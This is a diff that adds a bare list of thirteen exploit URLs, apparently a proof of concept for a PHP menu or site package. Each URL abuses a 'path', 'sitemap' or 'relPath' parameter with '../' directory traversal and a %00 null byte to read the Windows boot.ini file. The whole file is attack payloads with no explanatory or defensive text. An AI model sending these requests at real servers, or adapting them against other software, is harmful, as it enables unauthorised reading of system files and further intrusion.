@@ -1,0 +1,13 @@
+http://www.example.com/path/install/index.php?path=../../../../../../../boot.ini%00
+http://www.example.com/path/menus/left_rightslideopen/index.php?path=../../../../../../../../boot.ini%00
+http://www.example.com/path/menus/left_rightslideopen/index.php?sitemap=../../../../../../../../boot.ini%00
+http://www.example.com/path/menus/side_pullout/index.php?sitemap=../../../../../../../../boot.ini%00
+http://www.example.com/path/menus/side_pullout/index.php?path=../../../../../../../../boot.ini%00
+http://www.example.com/path/menus/side_slideopen/index.php?path=../../../../../../../../boot.ini%00
+http://www.example.com/path/menus/side_slideopen/index.php?sitemap=../../../../../../../../boot.ini%00
+http://www.example.com/path/menus/simple/index.php?path=../../../../../../../../boot.ini%00
+http://www.example.com/path/menus/top_dropdown/index.php?path=../../../../../../../../boot.ini%00
+http://www.example.com/path/menus/top_dropdown/index.php?sitemap=../../../../../../../../boot.ini%00
+http://www.example.com/path/menus/topside/index.php?sitemap=../../../../../../../../boot.ini%00
+http://www.example.com/path/menus/topside/index.php?path=../../../../../../../../boot.ini%00
+http://www.example.com/path/index/index.php?relPath=../../../../../../boot.ini%00
